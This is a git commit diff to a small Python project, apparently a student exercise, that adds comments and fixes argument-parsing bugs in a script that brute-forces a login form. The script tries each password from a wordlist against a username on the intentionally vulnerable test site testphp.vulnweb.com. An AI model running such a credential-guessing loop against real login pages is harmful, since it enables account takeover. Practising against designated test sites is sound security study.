7ccf53809910f96f2e07e4b441164eda0964b1a6
JonnyHam <jonajonkim@gmail.com>
2023-03-08 10:32:03 -0600

    Cleaned up commandline code and added comments

--- main.py
+++ main.py
@@ -1,42 +1,40 @@
 import sys
 from pathlib import Path
 
-from requests import post
 from sys import argv
-
+# This imports the password cracking python file to log into a username
 from password_crack import password_crack
 
+# These lines record the number of command lines and print them
 n = len(argv)
-wordlist = "book2.txt"
 print("total arguments passed: " + str(n))
-print("1st argument: " + argv[0])
-
+# These lines define if there are username and password commands
 defUsername = 0
 defWordlist = 0
-
+# These lines check where username or text file commands take place in the commandline.
 if n > 5:
     sys.exit("Error: Too many commands")
 elif n == 5:
     if argv[1] == "-u":
         username = argv[2]
         defUsername = 2
-    elif argv[1] == "-b" and Path(argv[1]).is_file():
+    elif argv[1] == "-b" and Path(argv[2]).is_file():
         wordList = argv[2]
         defWordlist = 2
     if argv[3] == "-u":
         username = argv[4]
         defUsername = 4
-    elif argv[3] == "-b" and Path(argv[3]).is_file():
+    elif argv[3] == "-b" and Path(argv[4]).is_file():
         wordList = argv[4]
         defWordlist = 4
 elif 5 > n > 1:
     if argv[1] == "-u":
         username = argv[2]
         defUsername = 2
-    elif argv[1] == "-b" and Path(argv[1]).is_file():
+    elif argv[1] == "-b" and Path(argv[2]).is_file():
         wordList = argv[2]
         defWordlist = 2
-
+# These lines print if certain commands are successful in the commandline, and what they entail.
 if defUsername:
     print("Successful username commandline argument, username: " + argv[defUsername])
 else:
@@ -47,6 +45,5 @@ if defWordlist:
 else:
     print("wordlist commandline argument not submitted / not found, Default wordlist: book2.txt")
     wordlist = "book2.txt"
-
+# This line redirects the wordlist and username variable values into the password cracking function.
 password_crack(wordlist, username)
-
--- password_crack.py
+++ password_crack.py
@@ -4,13 +4,20 @@ from requests import post
 def password_crack(wordlist, username):
     isLoggedIn = False
     url = "http://testphp.vulnweb.com/userinfo.php"
+    # this is the url of the website we have to crack
     with open(wordlist) as thefile:
+        # this opens the txt file that has all of our passwords inside of it
         for line in thefile:
+            # this a for loop that goes through each line of the file
             password = line.rstrip()  # rstrip removes trailing newlines from an input (before this 'line' is "word\n")
             payload = {"uname": username, "pass": password}
+            # This is the payload which delivers the username and password to the website
             request = post(url, data=payload, allow_redirects=False)
+            # this is how our request works with there being a url, payload and make sure that we arent redirected to a different webpage
             if request.status_code == 200:
+                # this checks if we successfully logged into the website or not
                 print(username + " logged in with " + password)
+                # it prints the username and password that was used to log into the website
                 isLoggedIn = True
                 exit()
         if not isLoggedIn:
